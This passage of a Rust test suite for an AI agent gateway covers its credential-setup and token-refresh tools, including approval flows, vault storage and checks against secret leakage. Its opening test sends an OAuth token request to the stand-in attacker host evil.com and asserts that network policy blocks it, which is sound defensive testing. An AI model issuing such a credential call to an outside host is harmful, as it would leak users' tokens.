                "steps": [{
                    "step_type": "api_call",
                    "method": "GET",
                    "url": "https://evil.com/oauth/token"
                }]
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_setup should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert_eq!(parsed["approval_required"].as_bool(), Some(true), "network policy should block pending approval");
}

#[test]
#[serial_test::serial]
fn test_credential_setup_user_action_succeeds() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["api.github.com".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("DUMMY", "dummy");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let result = registry
        .execute(
            "credential_setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "github",
                "steps": [{
                    "step_type": "user_action",
                    "instruction": "Visit github.com/settings/tokens to create a token"
                }]
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_setup should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], true);
    assert_eq!(parsed["service"], "github");
    assert_eq!(parsed["secrets_stored"], 0);
}

#[test]
#[serial_test::serial]
fn test_credential_setup_defaults_inject_as_to_service_derived_env_var() {
    // A flow that does not pass `inject_as` must still store a credential that
    // resolves by service at spawn time: `resolve_credential_env` matches
    // stored `inject_as` against `inject_as_for_service(service)`, so the
    // record must carry the derived name, not NULL (the missing-credential
    // class behind silent script-exec failures).
    let manifest = test_manifest(vec![Capability::CredentialAccess {
        services: vec!["github".to_string()],
    }]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("DUMMY", "dummy");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    // Call 1: a single user_input step suspends for a non-secret answer.
    let first = registry
        .execute(
            "credential_setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "github",
                "steps": [{
                    "step_type": "user_input",
                    "question": "Confirm the registration code",
                    "var_name": "code"
                }]
            })
            .to_string(),
            None,
            None,
            None,
            Some(store.clone()),
            None,
        )
        .expect("credential_setup call 1 should succeed");
    let first: serde_json::Value = serde_json::from_str(&first).expect("valid json");
    assert_eq!(first["suspended_for_user_input"], true);
    let credential_id = first["credential_id"].as_str().expect("credential_id present");

    // Call 2: resume with the answer — flow completes and the record is created.
    let second = registry
        .execute(
            "credential_setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "github",
                "credential_id": credential_id,
                "resume_vars": {"code": "sekret-value"}
            })
            .to_string(),
            None,
            None,
            None,
            Some(store.clone()),
            None,
        )
        .expect("credential_setup resume should succeed");
    let second: serde_json::Value = serde_json::from_str(&second).expect("valid json");
    assert_eq!(second["ok"], true);
    assert_eq!(second["secrets_stored"], 1);

    let cred = store
        .get_credential(credential_id)
        .expect("credential lookup")
        .expect("credential record exists");
    assert_eq!(
        cred.inject_as.as_deref(),
        Some("GITHUB_SECRET"),
        "inject_as must default to the service-derived env var"
    );
}

#[test]
#[serial_test::serial]
fn test_credential_setup_user_prompt_suspends_no_further_steps() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["api.github.com".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("DUMMY", "dummy");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let result = registry
        .execute(
            "credential_setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "github",
                "steps": [
                    {
                        "step_type": "user_action",
                        "instruction": "Go to github.com"
                    },
                    {
                        "step_type": "user_prompt",
                        "message": "Enter your token",
                        "secret_fields": [{"name": "token", "label": "GitHub Token", "masked": true}]
                    },
                    {
                        "step_type": "api_call",
                        "method": "GET",
                        "url": "https://api.github.com/user"
                    }
                ]
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_setup should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert_eq!(parsed["suspended"], true);
    assert_eq!(parsed["approval_required"], true);
    assert!(
        parsed["request_id"].as_str().is_some(),
        "request_id should be present"
    );
    let steps = parsed["steps"].as_array().expect("steps should be array");
    assert_eq!(steps.len(), 2);
    assert_eq!(steps[0]["step_type"], "user_action");
    assert_eq!(steps[1]["step_type"], "user_prompt");
    assert!(steps[1]["approval_request_id"].as_str().is_some());
}

#[test]
#[serial_test::serial]
fn test_credential_setup_extract_public_blocks_overlapping_secret_path() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "ghp_secret123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let (url, handle) = spawn_one_shot_http_server(
        "200 OK",
        "application/json",
        r#"{"token":"secret123","user":"alice"}"#.to_string(),
    );

    let result = registry
        .execute(
            "credential_setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "github",
                "steps": [{
                    "step_type": "api_call",
                    "method": "POST",
                    "url": format!("{}/oauth/token", url),
                    "extract_secrets": {
                        "GITHUB_TOKEN": "token"
                    },
                    "extract_public": {
                        "leaked_token": "token",
                        "username": "user"
                    }
                }]
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_setup should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], true);
    let public_data = parsed["public_data"]
        .as_object()
        .expect("public_data should be object");
    assert!(public_data.contains_key("username"));
    assert!(!public_data.contains_key("leaked_token"));

    handle.join().expect("server thread should join");
}

#[test]
#[serial_test::serial]
fn test_credential_setup_user_prompt_full_lifecycle() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("DUMMY", "dummy");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    // Step 1: Start credential_setup with a UserPrompt step
    let result = registry
        .execute(
            "credential_setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "github",
                "steps": [{
                    "step_type": "user_prompt",
                    "message": "Enter your GitHub token",
                    "secret_fields": [
                        {"name": "GITHUB_TOKEN", "label": "GitHub Token", "masked": true}
                    ]
                }]
            })
            .to_string(),
            None,
            None,
            None,
            Some(Arc::clone(&store)),
            None,
        )
        .expect("credential_setup should succeed");

    let suspended: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(suspended["ok"], false);
    assert_eq!(suspended["suspended"], true);
    assert_eq!(suspended["approval_required"], true);
    let request_id = suspended["request_id"]
        .as_str()
        .expect("request_id should be present");

    // Step 2: Approve the request with secrets (simulating operator action).
    // CredentialPrompt is classified as Critical and normally requires a dwell
    // period and a confirmation phrase; set the multiplier to 0 and provide the
    // phrase for this deterministic test.
    let mut approve_config = autonoetic_types::config::GatewayConfig::default();
    approve_config.approval_dwell_multiplier = 0.0;
    let credential_id = suspended["credential_id"]
        .as_str()
        .expect("credential_id should be present");
    let confirm_phrase = format!("register github {}", credential_id);
    autonoetic_gateway::scheduler::approve_request_with_options(
        &approve_config,
        Some(&store),
        request_id,
        "test",
        None,
        Some(vec![(
            "GITHUB_TOKEN".to_string(),
            "ghp_test_token_123".to_string(),
        )]),
        None,
        None,
        autonoetic_gateway::scheduler::ApproveOptions {
            grant_scope: None,
            grant_targets: Vec::new(),
            grant_expires_at: None,
            acknowledged_capabilities: Vec::new(),
            confirm_phrase: Some(confirm_phrase),
            decider_session_id: None,
            create_grant: None,
        },
    )
    .expect("approval should succeed");

    // Step 3: Verify the credential record was created
    let creds = store
        .list_credentials_by_service("github")
        .expect("list creds");
    assert_eq!(creds.len(), 1);
    assert_eq!(creds[0].service, "github");
    assert_eq!(creds[0].secret_name, "GITHUB_TOKEN");

    // Step 4: Retry credential_setup with approval_ref
    let result = registry
        .execute(
            "credential_setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "github",
                "steps": [{
                    "step_type": "user_prompt",
                    "message": "Enter your GitHub token",
                    "secret_fields": [
                        {"name": "GITHUB_TOKEN", "label": "GitHub Token", "masked": true}
                    ]
                }],
                "approval_ref": request_id
            })
            .to_string(),
            None,
            None,
            None,
            Some(Arc::clone(&store)),
            None,
        )
        .expect("credential_setup should succeed");

    let resumed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(resumed["ok"], true);
    assert_eq!(resumed["resumed_from_approval"], true);
    assert_eq!(resumed["credential_id"], creds[0].credential_id);

    // Step 5: Verify the secret is in the vault
    let vault = autonoetic_gateway::vault::Vault::load_from_file(&vault_file(&_vault_temp))
        .expect("load vault");
    assert_eq!(
        vault
            .get_secret("GITHUB_TOKEN")
            .expect("secret exists")
            .expose_secret(),
        "ghp_test_token_123"
    );
}

#[test]
#[serial_test::serial]
fn test_credential_setup_user_prompt_multi_field_stores_combined_blob() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["photos".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("DUMMY", "dummy");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    // Step 1: start a two-field user_prompt flow, with a dedup label.
    let result = registry
        .execute(
            "credential_setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "photos",
                "label": "default",
                "steps": [{
                    "step_type": "user_prompt",
                    "message": "Enter your account name and app token",
                    "secret_fields": [
                        {"name": "account_name", "label": "Account name", "masked": false},
                        {"name": "app_token", "label": "App token", "masked": true}
                    ]
                }]
            })
            .to_string(),
            None,
            None,
            None,
            Some(Arc::clone(&store)),
            None,
        )
        .expect("credential_setup should succeed");

    let suspended: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(suspended["ok"], false);
    assert_eq!(suspended["suspended"], true);
    let request_id = suspended["request_id"]
        .as_str()
        .expect("request_id should be present");
    let credential_id = suspended["credential_id"]
        .as_str()
        .expect("credential_id should be present")
        .to_string();

    // Step 2: approve with both secret fields (simulating operator action).
    let mut approve_config = autonoetic_types::config::GatewayConfig::default();
    approve_config.approval_dwell_multiplier = 0.0;
    approve_config.agents_dir = temp.path().to_path_buf();
    let confirm_phrase = format!("register photos {}", credential_id);
    autonoetic_gateway::scheduler::approve_request_with_options(
        &approve_config,
        Some(&store),
        request_id,
        "test",
        None,
        Some(vec![
            ("account_name".to_string(), "acct-1".to_string()),
            ("app_token".to_string(), "tok-9".to_string()),
        ]),
        None,
        None,
        autonoetic_gateway::scheduler::ApproveOptions {
            grant_scope: None,
            grant_targets: Vec::new(),
            grant_expires_at: None,
            acknowledged_capabilities: Vec::new(),
            confirm_phrase: Some(confirm_phrase),
            decider_session_id: None,
            create_grant: None,
        },
    )
    .expect("approval should succeed");

    // Step 3: the record points at the combined blob stored under the
    // credential id, keeps the declared label, and carries the
    // service-derived default inject_as.
    let cred = store
        .get_credential(&credential_id)
        .expect("get credential")
        .expect("credential exists");
    assert_eq!(cred.service, "photos");
    assert_eq!(cred.secret_name, credential_id);
    assert_eq!(cred.label.as_deref(), Some("default"));
    assert_eq!(cred.inject_as.as_deref(), Some("PHOTOS_SECRET"));

    // Step 4: the vault holds the combined JSON object plus the raw fields
    // (the raw entries keep {{secrets.<field>}} templates working). Load it
    // from this test's own tempdir rather than the process-global
    // AUTONOETIC_VAULT_PATH, which a sibling test can retarget mid-run.
    let vault = autonoetic_gateway::vault::Vault::load_from_file(&vault_file(&_vault_temp))
        .expect("load vault");
    let blob = vault
        .get_secret(&credential_id)
        .expect("combined blob exists")
        .expose_secret()
        .to_string();
    let blob: serde_json::Value = serde_json::from_str(&blob).expect("blob is json");
    assert_eq!(blob["account_name"], "acct-1");
    assert_eq!(blob["app_token"], "tok-9");
    assert_eq!(
        vault
            .get_secret("account_name")
            .expect("raw field exists")
            .expose_secret(),
        "acct-1"
    );
    assert_eq!(
        vault
            .get_secret("app_token")
            .expect("raw field exists")
            .expose_secret(),
        "tok-9"
    );

    // Step 5: a retry for the same (service, label) dedups — and a new
    // inject_as is applied instead of silently dropped, with the injection
    // contract reported back to the caller.
    let result = registry
        .execute(
            "credential_setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "photos",
                "label": "default",
                "inject_as": "PHOTOS_LOGIN"
            })
            .to_string(),
            None,
            None,
            None,
            Some(Arc::clone(&store)),
            None,
        )
        .expect("dedup retry should succeed");
    let deduped: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(deduped["ok"], true);
    assert_eq!(deduped["existing"], true);
    assert_eq!(deduped["credential_id"], credential_id);
    assert_eq!(deduped["inject_as_updated"], true);
    assert_eq!(deduped["inject_as"], "PHOTOS_LOGIN");
    assert_eq!(deduped["injection"]["env_var"], "PHOTOS_LOGIN");
    assert_eq!(deduped["injection"]["value_shape"], "json_object");
    assert_eq!(
        deduped["injection"]["field_env_vars"],
        serde_json::json!(["PHOTOS_ACCOUNT_NAME", "PHOTOS_APP_TOKEN"])
    );

    let cred = store
        .get_credential(&credential_id)
        .expect("get credential")
        .expect("credential exists");
    assert_eq!(
        cred.inject_as.as_deref(),
        Some("PHOTOS_LOGIN"),
        "the inject_as update must persist"
    );

    // Step 6: repeating the same update is a no-op (no spurious update flag).
    let result = registry
        .execute(
            "credential_setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "photos",
                "label": "default",
                "inject_as": "PHOTOS_LOGIN"
            })
            .to_string(),
            None,
            None,
            None,
            Some(Arc::clone(&store)),
            None,
        )
        .expect("second dedup retry should succeed");
    let deduped: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(deduped["existing"], true);
    assert!(
        deduped.get("inject_as_updated").is_none(),
        "an unchanged inject_as must not be reported as updated"
    );
}

#[test]
#[serial_test::serial]
fn test_credential_setup_approval_fails_with_missing_secrets() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("DUMMY", "dummy");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    // Start credential_setup with a UserPrompt step
    let result = registry
        .execute(
            "credential_setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "github",
                "steps": [{
                    "step_type": "user_prompt",
                    "message": "Enter your GitHub token",
                    "secret_fields": [
                        {"name": "GITHUB_TOKEN", "label": "GitHub Token", "masked": true},
                        {"name": "GITHUB_USER", "label": "GitHub User", "masked": false}
                    ]
                }]
            })
            .to_string(),
            None,
            None,
            None,
            Some(Arc::clone(&store)),
            None,
        )
        .expect("credential_setup should succeed");

    let suspended: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    let request_id = suspended["request_id"]
        .as_str()
        .expect("request_id should be present");

    // Approve with only one of two required secrets — should fail.
    // CredentialPrompt is Critical, so disable dwell and provide the required
    // confirmation phrase so the missing-secret check is reached.
    let mut approve_config = autonoetic_types::config::GatewayConfig::default();
    approve_config.approval_dwell_multiplier = 0.0;
    let credential_id = suspended["credential_id"]
        .as_str()
        .expect("credential_id should be present");
    let confirm_phrase = format!("register github {}", credential_id);
    let approval_result = autonoetic_gateway::scheduler::approve_request_with_options(
        &approve_config,
        Some(&store),
        request_id,
        "test",
        None,
        Some(vec![("GITHUB_TOKEN".to_string(), "ghp_test".to_string())]),
        None,
        None,
        autonoetic_gateway::scheduler::ApproveOptions {
            grant_scope: None,
            grant_targets: Vec::new(),
            grant_expires_at: None,
            acknowledged_capabilities: Vec::new(),
            confirm_phrase: Some(confirm_phrase),
            decider_session_id: None,
            create_grant: None,
        },
    );
    assert!(approval_result.is_err());
    assert!(approval_result
        .unwrap_err()
        .to_string()
        .contains("Missing required secret fields"));
}

#[test]
#[serial_test::serial]
fn test_credential_prompt_approval_carries_secret_fields_for_inspect() {
    // The TUI's in-modal credential entry flow reads `secret_fields` from the
    // stored approval action (surfaced via `approvals.inspect`). This test
    // pins the contract: a UserPrompt step with N fields produces a
    // CredentialPrompt approval whose action carries exactly those fields,
    // preserving name/label/masked.
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["gmail".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("DUMMY", "dummy");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let result = registry
        .execute(
            "credential_setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "gmail",
                "steps": [{
                    "step_type": "user_prompt",
                    "message": "Enter your Gmail App Password",
                    "secret_fields": [
                        {"name": "GMAIL_APP_PASSWORD", "label": "App Password", "masked": true}
                    ]
                }]
            })
            .to_string(),
            None,
            None,
            None,
            Some(Arc::clone(&store)),
            None,
        )
        .expect("credential_setup should succeed");

    let suspended: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert!(suspended["approval_required"].as_bool().unwrap_or(false));
    let request_id = suspended["request_id"]
        .as_str()
        .expect("request_id should be present");

    // The stored approval action must carry the secret-field spec so the
    // inspect RPC (and the TUI) can render the in-modal entry flow.
    let approval = store
        .get_approval(request_id)
        .expect("store lookup should succeed")
        .expect("approval should exist");
    use autonoetic_types::background::ScheduledAction;
    // Pending approvals carry `status: None` until decided.
    assert_eq!(approval.status, None);
    match &approval.action {
        ScheduledAction::CredentialPrompt {
            service,
            secret_fields,
            ..
        } => {
            assert_eq!(service, "gmail");
            assert_eq!(secret_fields.len(), 1, "exactly one secret field expected");
            assert_eq!(secret_fields[0].name, "GMAIL_APP_PASSWORD");
            assert_eq!(secret_fields[0].label, "App Password");
            assert!(secret_fields[0].masked, "app password field must be masked");
        }
        other => panic!("expected CredentialPrompt action, got {other:?}"),
    }
}

#[test]
#[serial_test::serial]
fn test_credential_setup_json_path_dollar_prefix() {
    let _value: serde_json::Value = serde_json::json!({
        "data": {
            "token": "secret123",
            "user": "alice"
        }
    });

    let result = autonoetic_gateway::runtime::store::parse_json_path("$.data.token");
    assert_eq!(result, vec!["data", "token"]);

    let result = autonoetic_gateway::runtime::store::parse_json_path("data.token");
    assert_eq!(result, vec!["data", "token"]);

    let result = autonoetic_gateway::runtime::store::parse_json_path("$.user");
    assert_eq!(result, vec!["user"]);
}

#[test]
#[serial_test::serial]
fn test_credential_setup_user_input_with_secret_fields_rejected() {
    let manifest = test_manifest(vec![Capability::CredentialAccess {
        services: vec!["gmail".to_string()],
    }]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("DUMMY", "dummy");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    // The agent improvised a `user_input` step carrying secret_fields (the
    // pre-fix failure mode): the gateway must reject it mechanically instead
    // of silently dropping the fields and dead-ending in a user.ask loop.
    let result = registry
        .execute(
            "credential_setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "gmail",
                "steps": [{
                    "step_type": "user_input",
                    "question": "Enter the app password generated in the previous step.",
                    "var_name": "app_password",
                    "secret_fields": [
                        {"name": "app_password", "label": "App Password", "masked": true}
                    ]
                }]
            })
            .to_string(),
            None,
            None,
            None,
            Some(Arc::clone(&store)),
            None,
        )
        .expect("credential_setup should return a response");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert_eq!(parsed["error_type"], "validation");
    let message = parsed["message"].as_str().unwrap_or("");
    assert!(
        message.contains("user_input step cannot collect secrets"),
        "unexpected message: {message}"
    );
    assert!(
        message.contains("user_prompt"),
        "repair hint must point at user_prompt: {message}"
    );
    assert_eq!(
        parsed["suspended_for_user_input"],
        serde_json::Value::Null,
        "must not suspend for user input — that path cannot carry secrets"
    );
}

#[test]
#[serial_test::serial]
fn test_credential_setup_missing_secret_capture_fails_loudly() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["gmail".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("DUMMY", "dummy");
    let temp = tempdir().unwrap();
    let (_server_url, _server_handle) = spawn_one_shot_http_server(
        "200 OK",
        "application/json",
        r#"{"status":"ok"}"#.to_string(),
    );
    std::fs::create_dir_all(temp.path().join("skills/gmail")).unwrap();
    // Skill that declares an injectable secret (`inject_as`) but whose onboarding
    // steps capture nothing (the broken-gmail-skill shape): the run must fail
    // loudly with missing_secret_capture instead of reporting `ok: true,
    // secrets_stored: 0`. No heuristic detection — the gate keys off the
    // planner's own structured declaration (`inject_as`).
    std::fs::write(
        temp.path().join("skills/gmail/SKILL.md"),
        format!(
            r#"---
autonoetic:
  credential:
    service: gmail
    inject_as: GMAIL_SECRET
    allowed_hosts:
    - 127.0.0.1
  onboarding:
    steps:
    - method: GET
      url: {_server_url}/apppasswords
      type: api_call
---
"#
        ),
    )
    .expect("skill should write");
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let result = registry
        .execute(
            "credential_setup",
            &manifest,
            &policy,
            temp.path(),
            Some(temp.path()),
            &serde_json::json!({
                "skill_url": "skills/gmail/SKILL.md",
            })
            .to_string(),
            None,
            None,
            None,
            Some(Arc::clone(&store)),
            None,
        )
        .expect("credential_setup should return a response");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert_eq!(parsed["error_type"], "validation");
    let message = parsed["message"].as_str().unwrap_or("");
    assert!(
        message.contains("no secrets stored") && message.contains("injectable secret"),
        "unexpected message: {message}"
    );
    let hint = parsed["repair_hint"].as_str().unwrap_or("");
    assert!(
        hint.contains("user_prompt"),
        "repair hint must point at user_prompt: {hint}"
    );

    // Nothing must be half-registered: no credential row, no vault secret.
    let creds = store
        .list_credentials_by_service("gmail")
        .expect("list creds");
    assert!(creds.is_empty(), "no credential record should exist");
    // This test's own vault — an absence assertion against an ambient path
    // some other test retargeted would pass vacuously.
    let vault = autonoetic_gateway::vault::Vault::load_from_file(&vault_file(&_vault_temp))
        .expect("load vault");
    assert!(
        vault.get_secret("app_password").is_none(),
        "no secret should be stored"
    );
}

// ---------------------------------------------------------------------------
// Credential auto-refresh on 401 (credential.rs ~L834) — zero-coverage flow
// pinned here (#1109), including the refresh-endpoint allowed_hosts binding
// (the gateway sends the refresh token to refresh_url; out-of-scope must
// not receive it).
// ---------------------------------------------------------------------------

/// A tiny two-endpoint HTTP fixture sharing state across one-shot servers:
/// - data server: first request -> 401 (token-1), any request whose
///   Authorization carries `expected_token` -> 200
/// - refresh server: POST -> `{"access_token": "<new>", "expires_in": 3600}`
/// Returns (data_url, refresh_url, data_requests, refresh_requests, handles).
fn spawn_refresh_fixture(
    ok_body: &str,
    expected_token: &str,
    refresh_json: String,
) -> (
    String,
    String,
    std::sync::Arc<std::sync::Mutex<Vec<String>>>,
    std::sync::Arc<std::sync::Mutex<Vec<String>>>,
    thread::JoinHandle<()>,
    thread::JoinHandle<()>,
) {
    let expected_token = expected_token.to_string();
    let data_requests: std::sync::Arc<std::sync::Mutex<Vec<String>>> =
        std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let refresh_requests: std::sync::Arc<std::sync::Mutex<Vec<String>>> =
        std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));

    let data_listener = TcpListener::bind("127.0.0.1:0").expect("bind data");
    let data_addr = data_listener.local_addr().unwrap();
    let reqs = data_requests.clone();
    let token = expected_token.clone();
    let body = ok_body.to_string();
    let data_handle = thread::spawn(move || {
        // The fixture accepts TWO sequential requests: the 401 then the retry.
        for i in 0..2 {
            let Ok((mut stream, _)) = data_listener.accept() else {
                return;
            };
            let mut request_buf = [0_u8; 4096];
            let n = stream.read(&mut request_buf).unwrap_or(0);
            let raw = String::from_utf8_lossy(&request_buf[..n]).to_string();
            reqs.lock().unwrap().push(raw.clone());
            let authorized = raw.contains(&format!("Bearer {token}")) || raw.contains(&token);
            let (status, body) = if i == 0 {
                ("401 Unauthorized", "expired token".to_string())
            } else if authorized {
                ("200 OK", body.clone())
            } else {
                ("401 Unauthorized", "wrong token".to_string())
            };
            let response = format!(
                "HTTP/1.1 {status}\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
            let _ = stream.write_all(response.as_bytes());
            let _ = stream.flush();
        }
    });

    let refresh_listener = TcpListener::bind("127.0.0.1:0").expect("bind refresh");
    let refresh_addr = refresh_listener.local_addr().unwrap();
    let rreqs = refresh_requests.clone();
    let refresh_handle = thread::spawn(move || {
        if let Ok((mut stream, _)) = refresh_listener.accept() {
            let mut request_buf = [0_u8; 4096];
            let n = stream.read(&mut request_buf).unwrap_or(0);
            rreqs
                .lock()
                .unwrap()
                .push(String::from_utf8_lossy(&request_buf[..n]).to_string());
            let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                refresh_json.len(),
                refresh_json
            );
            let _ = stream.write_all(response.as_bytes());
            let _ = stream.flush();
        }
    });

    (
        format!("http://{data_addr}"),
        format!("http://{refresh_addr}"),
        data_requests,
        refresh_requests,
        data_handle,
        refresh_handle,
    )
}

fn refresh_credential(host: String, refresh_url: String) -> CredentialRecord {
    CredentialRecord {
        credential_id: "cred_refresh_001".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: None,
        shared_with: vec![],
        allowed_hosts: vec![host],
        refresh_token_secret_name: Some("GITHUB_REFRESH".to_string()),
        refresh_url: Some(refresh_url),
        refresh_method: None,
        refresh_headers: None,
        refresh_extract_access_token: None,
        refresh_extract_refresh_token: None,
        refresh_extract_expires_in: Some("expires_in".to_string()),
        label: None,
    }
}

#[test]
#[serial_test::serial]
fn test_credential_request_401_triggers_refresh_then_succeeds() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "stale-token");
    vault_add_secret(&_vault_temp, "GITHUB_REFRESH", "refresh-tok-abc");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let (data_url, refresh_url, data_requests, refresh_requests, data_h, refresh_h) =
        spawn_refresh_fixture(
            "fresh data",
            "fresh-token-42",
            r#"{"access_token":"fresh-token-42","expires_in":3600}"#.to_string(),
        );
    let host = url::Url::parse(&data_url)
        .unwrap()
        .host_str()
        .unwrap()
        .to_string();
    store
        .upsert_credential(&refresh_credential(host, refresh_url))
        .unwrap();

    let result = registry
        .execute(
            "credential_request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_refresh_001",
                "url": format!("{}/data", data_url)
            })
            .to_string(),
            None,
            None,
            None,
            Some(store.clone()),
            None,
        )
        .expect("credential_request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], true, "refresh+retry must succeed: {parsed}");
    assert_eq!(parsed["status"], 200);
    assert_eq!(parsed["body"], "fresh data");

    // Exactly one refresh call, carrying the refresh token to the refresh
    // endpoint — and exactly two data calls (401 then authorized retry).
    assert_eq!(refresh_requests.lock().unwrap().len(), 1);
    assert!(refresh_requests.lock().unwrap()[0].contains("refresh-tok-abc"));
    assert_eq!(data_requests.lock().unwrap().len(), 2);
    assert!(data_requests.lock().unwrap()[1].contains("fresh-token-42"));

    // The vault now holds the rotated access token, and the credential row
    // picked up the computed expiry.
    let vault = autonoetic_gateway::Vault::load_from_file(&vault_file(&_vault_temp)).unwrap();
    assert_eq!(
        vault.get_secret("GITHUB_TOKEN").map(|s| s.expose_secret()),
        Some("fresh-token-42")
    );
    let cred = store
        .get_credential("cred_refresh_001")
        .unwrap()
        .expect("credential row");
    assert!(
        cred.expires_at.is_some(),
        "expires_in must update the credential expiry"
    );

    // No joins: the request-count assertions above are the contract — a
    // regression that changes the request pattern fails the asserts, and
    // the server threads die with their listeners at test end.
